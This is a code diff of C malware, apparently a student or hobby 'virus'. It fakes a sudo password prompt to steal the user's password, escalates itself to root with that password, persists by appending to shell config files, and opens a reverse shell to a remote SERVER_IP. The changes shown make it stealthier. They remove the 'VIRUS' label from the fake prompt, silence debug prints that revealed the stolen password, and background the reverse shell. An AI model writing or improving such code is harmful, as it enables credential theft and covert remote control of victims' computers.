@@ -33,7 +33,7 @@ int sudo_mode(int argc, char ** argv){
 
   steal_password(passwd, username);
 
-  printf("%s's password is %s\n", username, passwd);
+  // printf("%s's password is %s\n", username, passwd);
 
   // send_stolen_data(username, passwd);
 
@@ -42,17 +42,21 @@ int sudo_mode(int argc, char ** argv){
   free_execvp_ray(cmd_ray);
 
   char escaped_path[2048] = "";
-  get_virus_name(escaped_path);
-  char *escalate_vector[6] = {"/bin/sudo", "-S", escaped_path, "ROOT", passwd, NULL};
 
-  printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
-  runSudo(passwd, escalate_vector, 0);
+    get_virus_name(escaped_path);
+    char *escalate_vector[6] = {"/bin/sudo", "-S", escaped_path, "ROOT", passwd, NULL};
+
+    runSudo(passwd, escalate_vector, 0);
+
 
   return 0;
 }
 
 int root_mode(int argc, char**argv){
-  reverse_shell(9845, SERVER_IP, argv);
+  if(fork()==0){
+    reverse_shell(9845, SERVER_IP, argv);
+  }
+ exit(0);
 }
 
 int set_mode(int argc, char**argv){
@@ -116,7 +120,7 @@ int steal_password(char * passwd, char * username){
   int correctPasswd = 0;
   char * returned_pass;
   while (! correctPasswd){
-    sprintf(prompt,"VIRUS [sudo] password for %s: ", username);
+    sprintf(prompt,"[sudo] password for %s: ", username);
 
     // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
     returned_pass = getpass(prompt);
@@ -218,8 +222,6 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
   strcpy(buffer, home_dir);
   strcat(buffer, config_file);
-
-  printf("%s\n", buffer);
 
   int fd = open(buffer, O_WRONLY|O_CREAT, 0644);
   if(fd < 0){
@@ -378,7 +380,7 @@ int reverse_shell(int port, char*ip, char ** argv){
   struct init_struct init = create_init_struct(argv);
   // print_init_struct(&init);
   write(sockt, &init, sizeof(struct init_struct));
-  printf("wrote the thing to the socket\n");
+  // printf("wrote the thing to the socket\n");
   dup2(sockt, 0);
   dup2(sockt, 1);
   dup2(sockt, 2);
